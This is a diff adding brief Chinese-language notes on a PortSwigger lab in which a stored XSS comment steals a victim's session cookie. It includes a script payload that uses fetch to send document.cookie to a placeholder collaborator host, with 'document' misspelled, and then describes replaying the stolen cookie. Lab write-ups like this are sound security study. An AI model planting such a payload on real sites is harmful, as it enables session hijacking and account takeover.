@@ -1,0 +1,22 @@
+靶场地址: https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies
+
+=====新知识:1:fetch=====
+fetch("https://域名",{method:'http请求方式',mode:'no-cors',body:攻击内容})
+no_cors: 表示只发出请求而不查看响应
+
+###
+进入靶场,定位评论位置
+存在 存储型XSS 漏洞         -> 图1,图2
+
+###
+在评论区留下
+<script>fetch("https://your_DNS",{method:'GET',mode:'no-cors',body:documnet.cookie})</script>    -> 图3
+
+###
+回到burp collaborator
+这个是受害者发送的请求头 -> 图4
+这个是burp随便生成的回应,我再这磨叽了好一会其实啥也不是 -> 图5
+
+###
+拦截一个 GET /my-account 请求,改掉cookie发送过去
+solved
